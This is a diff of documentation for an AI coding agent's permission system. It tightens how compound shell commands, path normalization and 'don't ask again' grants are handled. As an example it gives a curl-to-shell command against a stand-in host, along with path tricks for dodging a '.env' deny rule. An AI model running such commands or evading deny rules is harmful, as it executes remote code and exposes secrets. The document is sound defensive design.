@@ -144,9 +144,14 @@ Two safety refinements to the matching:
 - **Compound commands are never auto-allowed.** A shell command containing `;`, `&`, `|`, a backtick, `$(`,
   `<`, `>` or a newline is not covered by an `allow` rule or a "don't ask again" grant (so a grant for
   `pytest` cannot approve `pytest && curl evil | sh`); it always asks, and answering `a` to it grants
-  nothing. Deny rules still match anywhere in it.
+  nothing. Deny rules still match anywhere in it. The rule covers `run_shell` and every command-kind tool
+  that takes a string `command` argument (an MCP bash tool, say).
+- **Path subjects are normalized.** For the path tools the subject (both sides of `move_file`) and the glob
+  of a rule are compared with backslashes turned into `/`, `./` and `..` resolved, an absolute path inside
+  the project made relative, and case folded on Windows, so a deny rule such as `read_path:.env` cannot be
+  dodged by `./.env`, `sub/../.env` or the absolute path.
 
-For `run_python` there is no command to take a prefix from, so `a` grants `run_python` for the session.
+`run_python` has no command to take a prefix from, so `a` approves that one call and remembers nothing.
 
 The prompt shows the proposed action: a coloured unified diff for `write_file` and `edit_file` (computed
 against the file on disk; for a new file, the whole content as additions), the exact command for
@@ -155,8 +160,13 @@ against the file on disk; for a new file, the whole content as additions), the e
 - `y`: allow this call.
 - `a`: don't ask again. For edits it switches the session to accept-edits. For commands it grants the
   command prefix for the session: the first word, or the first two words for `git`, `npm`, `pnpm`,
-  `yarn`, `pip`, `cargo`, `go`, `docker`, `make`. Not offered for destructive tools.
-- `n`: refuse; an optional reason can follow.
+  `yarn`, `pip`, `cargo`, `go`, `docker`, `make`. It remembers nothing for interpreters, shells and
+  wrappers (`python`, `python3`, `py`, `node`, `deno`, `bun`, `ruby`, `perl`, `php`, `bash`, `sh`, `zsh`,
+  `fish`, `pwsh`, `powershell`, `cmd`, `npx`, `sudo`, `su`, `ssh`, `eval`, `exec`, `env`, `xargs`, `nohup`,
+  `timeout`, `time`; matched by file name, so `/usr/bin/python3.12` counts), nor for compound commands,
+  `run_python` or destructive tools: it approves that one call. The prompt offers `a` only when the gate
+  can remember (`Request.remember`).
+- `n`: refuse; an optional reason can follow. Any answer other than `y`, `a` or `n` is treated as a decline.
 
 A refusal is an ordinary tool result, never an error: `"The user declined: <reason>"` (or
 `"The user declined this action."`). With no terminal to ask on, everything that would prompt is refused
